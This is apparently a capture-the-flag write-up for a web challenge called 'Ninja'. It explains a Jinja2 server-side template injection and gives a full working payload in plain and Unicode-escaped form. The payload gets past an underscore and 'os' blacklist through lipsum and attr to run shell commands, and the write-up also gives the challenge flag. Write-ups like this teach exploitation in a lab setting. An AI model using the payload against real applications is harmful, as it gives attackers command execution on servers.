# Ninja

Challenge's Desecription: Hey guys come checkout this website i made to test my ninja-coding skills.

# Vulnerability
First i thought This challenge will be XSS. But my one teammate told me that The challenge is SSTI jinja2 vulnerable. Thanks my mate. His discord(patrickaIi#7879)

# idea_for_solution

So we knew that is SSTI injection. By the problem is we can't inject any code. There is a blacklist. not allowed list:  _ ,config ,os, RUNCMD, base
F**k. They didn't allowed the os. This is a big problem. But we can bypass this with encoding. So the real problem is what encoding we need to use?. I used the unicode encoding to solve.

# Solution
I used the (lipsum) built in function of jinja2 and i used (attr) to bypass (underscores). and i used some other functions and i encode it with unicode.

So final payload is like this: {{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('cat flag.txt')|attr('read')()}}

I used this payload and GOt flag. Nice challenge.

# Payloads
original payload = lipsum|attr('__globals__'))|attr('__getitem__')('os')|attr('popen')('cat flag.txt')|attr('read')() And 
encoded payload = {{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('cat flag.txt')|attr('read')()}}

# Flag
flag{m0mmy_s33_1m_4_r34l_n1nj4}

# Sorry
I can't upload or put images here because of my laptop error. Sorry for this.
